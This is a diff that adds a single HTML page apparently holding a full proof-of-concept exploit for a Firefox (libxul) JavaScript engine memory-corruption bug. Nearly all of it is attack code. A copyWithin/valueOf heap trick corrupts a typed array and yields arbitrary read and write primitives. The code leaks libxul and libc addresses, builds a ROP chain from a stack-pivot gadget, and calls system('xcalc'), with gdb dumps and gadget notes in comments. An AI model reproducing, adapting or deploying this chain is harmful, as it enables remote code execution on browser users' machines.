@@ -1,0 +1,221 @@
+<script>
+var buffer;
+var ua;
+var vuln;
+var ay = new Array(0x800);
+var magic = 0x51535759;
+var magic1 = 0x71737779;
+
+function gc() {
+	tmp1 = [];
+	for (var i = 0; i < 0x100000; i++)
+  	tmp1.push(new Object());
+ 	tmp1 = null;
+} 
+
+for (var i = 0; i < 0x800; i++)
+{
+	ay[i] = new Array(2);
+}
+
+for (var i = 0; i < 0x800; i++)
+{
+	
+	ay[i][0] = [magic1, 0x41414141, 0x41414141, 0x41414141,
+	0x41414141, 0x41414141, 0x41414141, 0x41414141 + i];
+	ay[i][1] = new Uint32Array(0x10);
+	ay[i][1][0] = magic;
+}
+
+for (var i = 0; i < 0x800; i += 3)
+{
+	ay[i][0] = null;
+}
+
+ua = new Uint32Array(0x10);
+for (var j = 0; j < ua.length; j++)
+{
+	ua[j] = 0x43454749 + j;
+}
+
+var to = 10;
+var from = 1;
+var end = {
+	valueOf: function() {
+		ua.offset = 0x10;
+		gc();
+		return 2;
+	}
+};
+
+ua.copyWithin(to, from, end);
+
+for (var i = 0; i < 0x800; i++)
+{
+	if (ay[i][1].length != 0x10)
+	{
+		vuln = ay[i][1];
+	}
+}
+
+/*
+	 gdb-peda$ x/20gx 0x7f23e83c0980
+	 0x7f23e83c0980:	0x00007f23e6e6d6a0	0x00007f23e6e76448
+	 0x7f23e83c0990:	0x0000000000000000	0x00007f24304d1eb0
+	 0x7f23e83c09a0:	0x00003f91f41e04e0	0xfff8800000000040
+	 0x7f23e83c09b0:	0xfffe7f23e837ec80	0xfff8800000000000
+	 0x7f23e83c09c0:	0x4345474a43454749	0x4345474c4345474b
+	 0x7f23e83c09d0:	0x4345474e4345474d	0x434547504345474f
+	 0x7f23e83c09e0:	0x4345475243454751	0x4345475443454753
+	 0x7f23e83c09f0:	0x4345475643454755	0x4345475843454757
+	 0x7f23e83c0a00:	0x00007f23e6e6d520	0x00007f23e6e760d8
+	 0x7f23e83c0a10:	0x0000000000000000	0x00007f24304d1eb0
+	 gdb-peda$
+	 0x7f23e83c0a20:	0xfffc000000000000	0xfff8800000007f23
+	 0x7f23e83c0a30:	0xfff8800000000000	0x00007f23e83c0a40
+	 0x7f23e83c0a40:	0x0000000000000000	0x0000000000000000
+	 0x7f23e83c0a50:	0x0000000000000000	0x0000000000000000
+	 0x7f23e83c0a60:	0x0000000000000000	0x0000000000000000
+	 0x7f23e83c0a70:	0x0000000000000000	0x0000000000000000
+	 0x7f23e83c0a80:	0x00007f23e6e6d310	0x00007f23e6e6fa18
+	 0x7f23e83c0a90:	0x0000000000000000	0x00007f23e83c0ab0
+	 0x7f23e83c0aa0:	0x0000000800000000	0x000000080000000a
+	 0x7f23e83c0ab0:	0xfff8800041414142	0xfff8800041414141
+*/
+
+document.write('vuln ua length: ' + vuln.length + '<br>');
+
+var target_i;
+for (var i = 1; i < vuln.length; i += 1)
+{
+	if (vuln[i] == magic)
+	{
+		vuln[i] = magic + 1;
+		target_i = i;
+		break;
+	}
+}
+document.write('diff_i: ' + target_i + '<br>');
+target_low = vuln[target_i - 2];
+target_high = vuln[target_i - 1];
+target_addr = target_low + target_high * 0x100000000;
+
+var target_ua;
+for (var i = 0; i < 0x800; i++)
+{
+		if (ay[i][1][0] == magic + 1)
+		{
+			target_ua = ay[i][1];
+			break;
+		}
+}
+document.write('target_ua: ' + target_ua + '<br>');
+
+var target_array;
+var array_i;
+for (var i = 1; i < vuln.length; i += 1)
+{
+	if (vuln[i] == magic1)
+	{
+		vuln[i] = magic1 + 1;	
+		array_i = i;
+		break;
+	}
+}
+document.write('array_i: ' + array_i + '<br>');
+
+for (var i = 0; i < 0x800; i++)
+{
+		if (ay[i][0] != null && ay[i][0][0] == magic1 + 1)
+		{
+			target_array = ay[i][0];
+			break;
+		}
+}
+document.write('target_array: ' + target_array + '<br>');
+
+function read8(addr)
+{
+	var orig_low = vuln[target_i - 1];
+	var orig_high = vuln[target_i - 2];
+	vuln[target_i - 1] = (addr - addr % 0x100000000) / 0x100000000;
+	vuln[target_i - 2] = addr % 0x100000000;
+	var ret = target_ua[0] + target_ua[1] * 0x100000000;
+	vuln[target_i - 1] = orig_low;
+	vuln[target_i - 2] = orig_high;
+	return ret;
+}
+
+function write8(addr, value)
+{
+	var orig_low = vuln[target_i - 1];
+	var orig_high = vuln[target_i - 2];
+	vuln[target_i - 1] = (addr - addr % 0x100000000) / 0x100000000;
+	vuln[target_i - 2] = addr % 0x100000000;
+	target_ua[0] = value % 0x100000000;
+	target_ua[1] = (value - value % 0x100000000) / 0x100000000;
+	vuln[target_i - 1] = orig_low;
+	vuln[target_i - 2] = orig_high;
+}
+
+target_array[0] = document.createElement('div');
+div_low = vuln[array_i];
+div_high = vuln[array_i + 1];
+div_addr = div_low + (div_high % 0x10000) * 0x100000000;
+document.write('div addr: ' + div_addr.toString(16) + '<br>');
+
+div_obj_ptr = div_addr + 0x20;
+div_obj = read8(div_obj_ptr);
+div_obj = div_obj + div_obj;
+document.write('div obj addr: ' + div_obj.toString(16) + '<br>');
+
+div_vftable = read8(div_obj);
+document.write('div vftable addr: ' + div_vftable.toString(16) + '<br>');
+
+libxul_base = div_vftable - 0x4a63080;
+strcmp_got = libxul_base + 0x4b1e090;
+strcmp_addr = read8(strcmp_got);
+document.write('strcmp addr: ' + strcmp_addr.toString(16) + '<br>');
+system_addr = strcmp_addr - 0x59630;
+document.write('system addr: ' + system_addr.toString(16) + '<br>');
+
+/*
+	 0x00eb62d6: xchg rax, rsp ; dec dword [rax-0x75] ; and al, 0x08 ; add rsp, 0x10 ; pop rbx ; ret  ;  (1 found)
+
+	 .text:0000000002AD4947                 pop     rdi
+	 .text:0000000002AD4948                 retn
+*/
+
+pivot = libxul_base + 0xeb62d6;
+pret = libxul_base + 0x2ad4947;
+
+target_array[1] = new ArrayBuffer(0x800);
+var new_ua = new Uint32Array(target_array[1]);
+
+ab_low = vuln[array_i + 2];
+ab_high = vuln[array_i + 3];
+ab_addr = ab_low + (ab_high % 0x10000) * 0x100000000;
+document.write('ab addr: ' + ab_addr.toString(16) + '<br>');
+ab_buffer_ptr = ab_addr + 0x20;
+ab_buffer = read8(ab_buffer_ptr);
+ab_buffer = ab_buffer + ab_buffer;
+document.write('ab buffer addr: ' + ab_buffer.toString(16) + '<br>');
+str_buffer = ab_buffer + 0x80 * 4
+
+new_ua[0x440 / 0x4] = pivot % 0x100000000; //0x43434343; // system_addr % 0x100000000;
+new_ua[0x440 / 0x4 + 1] = (pivot - pivot % 0x100000000) / 0x100000000; // (system_addr - system_addr % 0x100000000) / 0x100000000;
+new_ua[6] = pret % 0x100000000;
+new_ua[7] = (pret - pret % 0x100000000) / 0x100000000;
+new_ua[8] = str_buffer % 0x100000000;
+new_ua[9] = (str_buffer - str_buffer % 0x100000000) / 0x100000000;
+new_ua[10] = system_addr % 0x100000000;
+new_ua[11] = (system_addr - system_addr % 0x100000000) / 0x100000000;
+new_ua[12] = 0x42424242;
+new_ua[13] = 0x43434343;
+new_ua[0x80] = 0x6c616378;
+new_ua[0x81] = 0x63;
+
+write8(div_obj, ab_buffer);
+target_array[0].blur();
+
+</script>
